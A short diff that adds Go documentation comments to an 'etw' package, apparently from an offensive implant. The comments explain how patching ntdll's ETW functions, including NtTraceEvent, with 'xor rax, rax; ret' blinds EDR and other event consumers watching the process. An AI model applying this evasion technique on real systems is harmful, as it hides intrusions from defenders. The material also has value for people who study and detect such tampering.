@@ -12,4 +12,12 @@
 // without logging.
 //
 // PatchNtTraceEvent patches the lower-level NtTraceEvent with a single RET.
+//
+// How it works: ETW is the primary telemetry pipeline in Windows, used by EDR
+// and security products to receive real-time events from both user-mode and
+// kernel-mode providers. By patching the ETW event writing functions in the
+// process's own copy of ntdll.dll, the implant prevents any ETW events from
+// being emitted from its process. The patch replaces each function's prologue
+// with "xor rax, rax; ret", which returns STATUS_SUCCESS (0) without writing
+// any event data, effectively blinding any ETW consumer monitoring the process.
 package etw
